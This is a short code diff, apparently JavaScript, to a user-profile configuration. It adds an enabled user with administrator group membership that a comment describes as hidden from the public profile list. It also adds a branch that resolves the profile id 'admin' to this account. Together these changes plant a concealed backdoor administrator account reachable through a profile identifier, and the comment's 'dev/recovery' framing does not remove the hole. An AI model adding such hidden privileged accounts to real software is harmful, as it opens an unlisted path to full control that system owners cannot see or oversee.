@@ -151,6 +151,14 @@
           displayName: 'Guest',
           enabled: true,
           groups: ['guests', 'users']
+        },
+        {
+          // Hidden virtual administrator. The account is never returned by the
+          // public profile list; it exists for explicit dev/recovery use only.
+          id: 'administrator',
+          displayName: 'Administrator',
+          enabled: true,
+          groups: ['administrators', 'users']
         }
       ],
       groups: [
@@ -681,6 +689,7 @@
       let candidate = null;
       if (this._profileId === 'owner') candidate = 'owner';
       else if (this._profileId === 'guest') candidate = 'guest';
+      else if (this._profileId === 'admin') candidate = 'administrator';
       else if (profile && profile.id) candidate = profile.id;
       const user = this._config.users.find(function (entry) {
         return entry.id === candidate;
